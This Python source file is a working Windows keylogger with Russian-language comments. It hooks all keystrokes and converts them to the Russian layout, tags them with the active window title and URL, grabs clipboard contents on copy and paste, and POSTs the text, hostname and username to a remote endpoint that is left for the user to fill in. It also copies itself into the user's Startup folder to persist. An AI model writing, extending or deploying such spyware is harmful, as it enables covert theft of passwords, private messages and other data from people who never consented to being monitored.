import keyboard
from keyboard import KeyboardEvent
import pygetwindow as gw
import time
import re
from pynput import mouse
import requests
import ctypes
import getpass
import pyperclip
import os
import sys
import socket
import shutil



# ==== SYMBOLS ====
launguages = {
    0x0419: {  # Русская раскладка
        # Нижний регистр (основная раскладка)
        'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г',
        'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы',
        'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
        ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
        'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.',

        # Верхний регистр (Shift + символ)
        'Q': 'Й', 'W': 'Ц', 'E': 'У', 'R': 'К', 'T': 'Е', 'Y': 'Н', 'U': 'Г',
        'I': 'Ш', 'O': 'Щ', 'P': 'З', '{': 'Х', '}': 'Ъ', 'A': 'Ф', 'S': 'Ы',
        'D': 'В', 'F': 'А', 'G': 'П', 'H': 'Р', 'J': 'О', 'K': 'Л', 'L': 'Д',
        ':': 'Ж', '"': 'Э', 'Z': 'Я', 'X': 'Ч', 'C': 'С', 'V': 'М', 'B': 'И',
        'N': 'Т', 'M': 'Ь', '<': 'Б', '>': 'Ю', '?': ',',

        # Цифровой ряд БЕЗ Shift (русская раскладка)
        '1': '1', '2': '2', '3': '3', '4': '4', '5': '5',
        '6': '6', '7': '7', '8': '8', '9': '9', '0': '0',
        '-': '-', '=': '=',

        # Цифровой ряд С Shift (русская раскладка)
        '!': '!', '@': '"', '#': '№', '$': ';', '%': '%',
        '^': ':', '&': '?', '*': '*', '(': '(', ')': ')',
        '_': '_', '+': '+',

        # Специальные символы
        '`': 'ё', '~': 'Ё',
        '\\': '\\', '|': '/',
        '№': '#'
    },
}



# ==== PROGRAM ====
class KeyLPOST:
    def __init__(self, endpoint_resource):
        self.compname = socket.gethostname()
        self.ENDPOINT_RESOURCE = endpoint_resource
        self.ACTIVE_WINDOW = None
        self.LAST_TEXT = ""
        self.BUFFER = ""
        self.backspace_hold_start = None


    def get_window_info(self):
        try:
            window = gw.getActiveWindow()
            if window:
                title = window.title
                url_match = re.search(r"(https?://[^\s]+)", title)
                url = url_match.group(1) if url_match else "no_url"
                return f"{window.title.split(' - ')[0]} | {url}"
            return "Unknown"
        except:
            return "Unknown"


    def on_key_press(self, event: KeyboardEvent):
        if event.event_type!=keyboard.KEY_DOWN:
            if event.name=='backspace':
                if self.backspace_hold_start:
                    hold_duration = time.time()-self.backspace_hold_start
                    if hold_duration>=0.5:
                        self.BUFFER += f"[backspace {round(hold_duration, 2)}s]"
                if not self.backspace_hold_start or hold_duration<0.5:
                    self.BUFFER = self.BUFFER[:-1]
                self.backspace_hold_start = None
            return

        current_window = self.get_window_info()
        if current_window!=self.ACTIVE_WINDOW and len(self.BUFFER)>1:
            if self.BUFFER.strip() and self.ACTIVE_WINDOW and self.BUFFER!=self.LAST_TEXT:
                self.logging(f"[{self.ACTIVE_WINDOW}]: {self.BUFFER}\n")
                self.LAST_TEXT = self.BUFFER
                self.BUFFER = ""
            self.ACTIVE_WINDOW = current_window

        hwnd = ctypes.windll.user32.GetForegroundWindow()
        thread_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, 0)
        layout = ctypes.windll.user32.GetKeyboardLayout(thread_id) & 0xFFFF
        if layout in launguages:
            launguage = launguages[layout]
        else:
            launguage = None

        if event.name=='backspace':
            if not self.backspace_hold_start:
                self.backspace_hold_start = time.time()
        elif event.name=='enter':
            if self.BUFFER.strip() and self.ACTIVE_WINDOW and self.BUFFER!=self.LAST_TEXT:
                self.logging(f"[{self.ACTIVE_WINDOW}]: {self.BUFFER}\n")
                self.LAST_TEXT = self.BUFFER
                self.BUFFER = ""
        elif event.name=='space':
            self.BUFFER += ' '
        elif len(event.name)==1:
            char = event.name
            if launguage and char in launguage.keys():
                self.BUFFER += launguage[char]
            else:
                self.BUFFER += char


    def on_click(self, x, y, button, pressed):
        if pressed:
            if self.BUFFER.strip() and self.ACTIVE_WINDOW and self.BUFFER!=self.LAST_TEXT:
                self.logging(f"[{self.ACTIVE_WINDOW}]: {self.BUFFER}\n")
                self.LAST_TEXT = self.BUFFER
                self.BUFFER = ""


    def logging(self, text_data):
        try:
            requests.post(
                self.ENDPOINT_RESOURCE,
                json={
                    "computer_name": self.compname,
                    "username": getpass.getuser(),
                    "text": text_data.replace("\n", "")
                },
                headers={"Content-Type": "application/json"})
        except Exception as e: print(e)



class Main:
    def __init__(self, ip):
        self.klgrr = KeyLPOST(ip)


    def add_script_into_autostartup(self):
        if getattr(sys, 'frozen', False):
            src_path = sys.executable
        else:
            src_path = __file__
        script_name = os.path.basename(__file__)

        autostart_path = f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
        if not os.path.exists(f"{autostart_path}/{script_name}"):
            shutil.copy(src_path, autostart_path)


    def main(self):
        self.add_script_into_autostartup()
        self.init_listeners()
        self.pool()


    def init_listeners(self):
        keyboard.hook(self.klgrr.on_key_press)
        keyboard.add_hotkey('ctrl+c', lambda: self.logging(f"[{self.klgrr.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
        keyboard.add_hotkey('ctrl+v', lambda: self.logging(f"[{self.klgrr.ACTIVE_WINDOW}]: {pyperclip.paste()}"))
        self.mouse_listener = mouse.Listener(on_click=self.klgrr.on_click)
        self.mouse_listener.start()
        self.klgrr.logging("Компьютер запущен")


    def pool(self):
        try:
            while True:
                time.sleep(0.05)
        except Exception as e:
            self.mouse_listener.stop()
            self.klgrr.logging(f"Компьютер завершил работу из-за не предвиденной ошибки: {e}")



# ==== START ====
if __name__=="__main__":
    Main("http://127.0.0.1:5000").main() # Write endpoint IP or domain here
